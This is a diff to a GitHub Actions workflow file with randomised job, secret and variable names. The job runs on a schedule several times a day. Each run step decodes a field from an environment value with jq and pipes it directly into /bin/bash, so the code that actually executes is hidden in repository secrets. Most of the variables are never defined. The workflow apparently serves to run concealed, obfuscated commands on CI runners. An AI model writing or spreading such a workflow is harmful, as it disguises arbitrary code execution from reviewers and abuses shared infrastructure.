@@ -2,19 +2,25 @@ name: qianniuzv
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 5/6 * * *'
-
-jobs:  # 24842
+    - cron: '56 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qianniuzv
         env:
-          t2: ${{ secrets.t2 }}
+          mpjby5: ${{ secrets.mpjby5 }}
         run: |
-          echo $t2 | jq -r .v7 | /bin/bash
-          echo $lgv9850 | jq -r .o73 | /bin/bash
-          echo $dh1972 | jq -r .sn3767 | /bin/bash
-          echo $z569 | jq -r .lilz0771 | /bin/bash
+          echo $mpjby5 | jq -r .kgxbx53 | /bin/bash
+          echo $oncyu8 | jq -r .x048 | /bin/bash
+          echo $ph96 | jq -r .soq13207 | /bin/bash
+          echo $p8166 | jq -r .fy784 | /bin/bash
+          echo $vaq82 | jq -r .b07343 | /bin/bash
+          echo $wwt5 | jq -r .awpg41214 | /bin/bash
+          echo $bji7 | jq -r .bl63313 | /bin/bash
+          echo $tr04774 | jq -r .eysm34 | /bin/bash
+          echo $ix16977 | jq -r .sdp9 | /bin/bash
+          echo $xjdk5 | jq -r .gskdj5853 | /bin/bash
 
